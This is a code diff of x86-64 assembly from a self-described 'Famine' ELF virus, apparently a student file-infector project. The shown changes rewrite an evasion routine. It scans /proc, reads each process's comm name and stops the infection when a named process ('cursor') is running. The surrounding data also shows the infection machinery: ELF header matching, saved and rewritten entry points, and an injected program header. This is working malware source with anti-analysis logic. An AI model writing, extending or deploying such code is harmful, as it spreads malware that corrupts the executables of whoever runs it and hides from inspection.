@@ -535,8 +535,8 @@ end_:
 
 	; check active forbidden process
 	call _check_forbidden_process
-	test rax, rax
-	jz .just_quit
+	cmp rax, 1
+	je .just_quit
 
 	mov		rax, [rel entry]
 	mov		[rel new_entry], rax
@@ -596,48 +596,46 @@ _is_debugged:
 
 ; Check forbidden process ---
 _check_forbidden_process:
-	mov rax, SYS_open
-	lea rdi, [rel proc_path]
-	xor rsi, rsi
-	xor rdx, rdx
-	syscall
-	cmp rax, 0
-	jl .ret
-
-	mov r12, rax
+    mov     rax, SYS_open
+    lea     rdi, [rel proc_prefix]
+    xor     rsi, rsi
+    xor     rdx, rdx
+    syscall
+    cmp     rax, 0
+    jl      .ret
+    mov     r12, rax               ; save fd
 
 .read_dir:
-	mov rax, SYS_getdents64
-	lea rdi, r12
-	lea rsi, [rel buff]
-	mov rdx, 4096
-	syscall
-	cmp rax, 0
-	jl .close_getdents
-
-	mov r12, rax
-	xor r13, r13
+    mov     rax, SYS_getdents64
+    mov     rdi, r12
+    lea     rsi, [rel buff]
+    mov     rdx, 4096
+    syscall
+    cmp     rax, 0
+    jle     .close_getdents ; 0 = EOF, <0 = error
+    mov     r14, rax    ; bytes read
+    xor     r13, r13  ; offset = 0
 
 .read_getdents_entry:
-	cmp r10, r13
-	jle .close_getdents
+    cmp     r13, r14
+    jge     .read_dir   
 
-	xor r10, r10
-	lea rdi, [rel buff]
-	add rdi, r13
-    movzx	r10, word [rdi + 16]        ; d_reclen
-    xor     rax, rax
-   	mov	    al,  byte [rdi + r10 - 1]   ; file type
-    lea     rsi, [rdi  + 18]            ; address of d_name field
-    add     r13, r10
-    cmp     al,  DT_DIR
-    jne     .read_getdents_entry
-    push    r15
-    jmp    .parse_dir
+    lea     rdi, [rel buff]
+    add     rdi, r13
+    movzx   r10, word [rdi + 16]       ; d_reclen
+    mov     al, byte [rdi + r10 - 1]   ; d_type
+    lea     rsi, [rdi + 18]            ; pointer to d_name
+    add     r13, r10                   ; advance offset
+
+    cmp     al, DT_DIR
+    jne     .read_getdents_entry     
+
+    push    rsi                      
+	mov r15, rsi
+    call    _parse_dir              
 
 .loop:
-	xor r15, r15
-	pop r15
+	pop rsi
 	jmp .read_getdents_entry
 
 .close_getdents:
@@ -649,103 +647,79 @@ _check_forbidden_process:
 	mov rax, 0
 	ret
 
+
 ; parse process dir ---
-.parse_dir:
-	mov rdi, r15
-	lea rdx, [rel proc_path]
+_parse_dir:
+	mov rdi, r15  
+	lea rdx, [rel path_buffer]    
 
-.dirname:
-	mov     al, byte [rdi]
-	test    al, al
-	jz      .filename
-	mov     byte [rdx], al
-	inc     rdi
-	inc     rdx
-	jmp     .dirname
-	
-.filename:
-	mov     al, byte [rsi]
-	test    al, al
-	jz      .find_process_name
-	mov     byte [rdx], al
-	inc     rsi
-	inc     rdx
-	jmp     .dirname
+	; Copy "/proc/"
+	lea rsi, [rel proc_prefix]
+.copy_proc:
+	lodsb
+	test al, al
+	jz .copy_pid
+	stosb
+	jmp .copy_proc
 
-.find_process_name:
+.copy_pid:
+	mov rsi, r15
+.copy_pid_loop:
+	lodsb
+	test al, al
+	jz .copy_comm
+	stosb
+	jmp .copy_pid_loop
+
+.copy_comm:
 	lea rsi, [rel comm_path]
-
-.concat_comm_path:
-	mov al, byte [rsi]
+.copy_comm_loop:
+	lodsb
 	test al, al
 	jz .open_comm
-	mov byte [rdx], al
-	inc rsi
-	inc rdx
-	jmp .concat_comm_path
+	stosb
+	jmp .copy_comm_loop
 
 .open_comm:
 	mov rax, SYS_open
-	lea rdi, [rel comm_path]
-	xor rsi, rsi
+	lea rdi, [rel path_buffer]
+	xor rsi, rsi ; O_RDONLY
 	xor rdx, rdx
 	syscall
-	cmp rax, 0
-	jz .loop
+	test rax, rax
+	js .ret_continue
+	mov r12, rax        ; save fd
 
-.check_comm_name:
-	mov r14, rax    ; save fd
-	
-	; read process name from /proc/PID/comm
+.read_comm:
+	mov rdi, r12
 	mov rax, SYS_read
-	mov rdi, r14
-	lea rsi, [rel padd]  ; use padd buffer to store process name
-	mov rdx, 16          ; comm names are max 15 chars + newline
+	lea rsi, [rel comm_buff]
+	mov rdx, 7
 	syscall
-	cmp rax, 0
-	jle .close_file
-	
-	; remove newline if present
-	lea rdi, [rel padd]
-	mov rcx, rax
-	dec rcx
-	add rdi, rcx
-	cmp byte [rdi], 0xa  ; check if last char is newline
-	jne .no_newline
-	mov byte [rdi], 0    ; replace newline with null terminator
-.no_newline:
-	
-	; compare with forbidden processes
-	lea rdi, [rel padd]
-	lea rsi, [rel forbidden_process]
+	test rax, rax
+	jle .close_comm
+
+.check_match:
+	lea rsi, [rel comm_buff]
+	lea rdi, [rel forbidden_process]
 	call ft_strcmp
 	cmp eax, 0
-	je .forbidden_found  ; if equal, forbidden process found
-	
-	; you can add more forbidden processes here by checking against other strings
-	
-	jmp .close_file
+	je .forbidden_found
 
-.forbidden_found:
-	; close current file
-	mov rax, SYS_close
-	mov rdi, r14
-	syscall
-	
-	; close directory
-	mov rax, SYS_close
+.close_comm:
 	mov rdi, r12
+	mov rax, SYS_close
 	syscall
-	
-	; return 1 to indicate forbidden process found
-	mov rax, 1
+
+.ret_continue:
 	ret
 
-.close_file:
-	mov rdi, r14  ; use saved fd instead of rax
+.forbidden_found:
+	mov rdi, r12
 	mov rax, SYS_close
 	syscall
-	jmp .loop
+	mov rax, 1         ; signal forbidden process found
+	ret
 
 
 ; Utils ---
@@ -769,27 +743,25 @@ ft_strcmp:
 		ret
 
 ; -----
+elfb	times 0064 db 0
+file	db 'elf64 found!', 0
+signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
+old_entry		   dq 0
+new_entry		   dq 0
+self	db '/proc/self/exe', 0
+last	db '..', 0
+curr	db '.', 0
+elfh	db 0x7f, 'ELF'
+one		db 1
+zero	db 0
+paddi	dq 0
+entry	dq 0
+exec	dd 7
 
-	elfb	times 0064 db 0
-	file	db 'elf64 found!', 0
-	signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
-	old_entry		   dq 0
-	new_entry		   dq 0
-	self	db '/proc/self/exe', 0
-	last	db '..', 0
-	curr	db '.', 0
-	elfh	db 0x7f, 'ELF'
-	one		db 1
-	zero	db 0
-	paddi	dq 0
-	entry	dq 0
-	exec	dd 7
-
-	; forbidden process
-	proc_path db '/proc/', 0
-	comm_path db '/comm', 0
-	forbidden_process:
-		db 'sdfsdfsdfsdfdsfsdf', 0
+; forbidden process
+proc_prefix db '/proc/', 0
+comm_path db '/comm', 0
+forbidden_process db 'cursor', 0
 
 ; NEW HEADER
 new_programheader:
@@ -808,5 +780,7 @@ new_programheader:
 buffer_bss:
 	padd	times 0512 db 0
 	buff	times 4096 db 0
+	comm_buff times 7 db 0
+	path_buffer times 64 db 0
 
 end_addr:
